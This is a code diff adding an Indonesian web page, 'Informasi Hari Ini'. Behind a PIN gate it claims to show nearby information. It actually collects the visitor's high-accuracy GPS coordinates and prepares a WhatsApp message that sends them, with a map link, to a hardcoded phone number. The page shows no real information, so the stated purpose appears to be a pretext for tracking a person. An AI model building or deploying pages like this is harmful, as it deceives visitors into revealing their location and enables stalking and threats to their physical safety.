@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Informasi Hari Ini</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="box" id="pinBox">
+  <h2>Masukkan PIN</h2>
+  <p>Untuk melanjutkan, silakan masukkan PIN</p>
+  <input type="password" id="pinInput" placeholder="PIN">
+  <button onclick="cekPIN()">Lanjutkan</button>
+  <p id="pinStatus"></p>
+</div>
+
+<div class="box" id="mainBox" style="display:none;">
+  <h2>Informasi Hari Ini</h2>
+  <p>Aktifkan lokasi untuk menampilkan informasi terdekat.</p>
+
+  <button onclick="ambilLokasi()">Lanjutkan</button>
+
+  <div id="map"></div>
+  <a id="waBtn" target="_blank"></a>
+</div>
+
+<script>
+const PIN_BENAR = "2580"; // 🔴 GANTI PIN DI SINI
+const nomorWA = "6285781132839";
+
+function cekPIN() {
+  const input = document.getElementById("pinInput").value;
+  const status = document.getElementById("pinStatus");
+
+  if (input === PIN_BENAR) {
+    document.getElementById("pinBox").style.display = "none";
+    document.getElementById("mainBox").style.display = "block";
+  } else {
+    status.innerHTML = "PIN salah";
+  }
+}
+
+function ambilLokasi() {
+  if (!navigator.geolocation) {
+    alert("Perangkat tidak mendukung lokasi");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      document.getElementById("map").innerHTML = `
+        <iframe
+          src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"
+          width="100%" height="220"
+          style="border-radius:8px; margin-top:12px;"
+          loading="lazy">
+        </iframe>
+      `;
+
+      const pesan = encodeURIComponent(
+        "Halo, saya sudah membuka link informasi hari ini.\n\n" +
+        "Lokasi saya:\n" +
+        "Latitude: " + lat + "\n" +
+        "Longitude: " + lon + "\n\n" +
+        "Google Maps:\nhttps://maps.google.com/?q=" + lat + "," + lon
+      );
+
+      const waBtn = document.getElementById("waBtn");
+      waBtn.href = "https://wa.me/" + nomorWA + "?text=" + pesan;
+      waBtn.innerText = "Kirim Lokasi via WhatsApp";
+      waBtn.style.display = "block";
+    },
+    () => {
+      alert("Izin lokasi tidak diberikan");
+    },
+    { enableHighAccuracy: true }
+  );
+}
+</script>
+
+</body>
+</html>
